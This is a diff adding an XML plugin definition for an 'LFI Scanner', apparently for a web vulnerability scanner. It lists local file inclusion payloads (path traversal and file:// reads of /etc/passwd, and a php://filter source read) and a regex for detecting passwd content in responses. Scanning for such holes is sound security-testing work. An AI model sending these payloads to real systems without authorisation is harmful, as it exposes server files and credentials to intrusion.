@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<plugin>
+    <name>LFI Scanner</name>
+    <version>1.0</version>
+    <author>NetRaven</author>
+    <description>Tests for Local File Inclusion vulnerabilities</description>
+    <category>lfi</category>
+    <requires>curl</requires>
+    <attack type="lfi">
+        <payload>../../../../etc/passwd</payload>
+        <payload>php://filter/convert.base64-encode/resource=index</payload>
+        <payload>file:///etc/passwd</payload>
+        <detection>root:x|/etc/passwd|apache|nginx</detection>
+    </attack>
+</plugin>
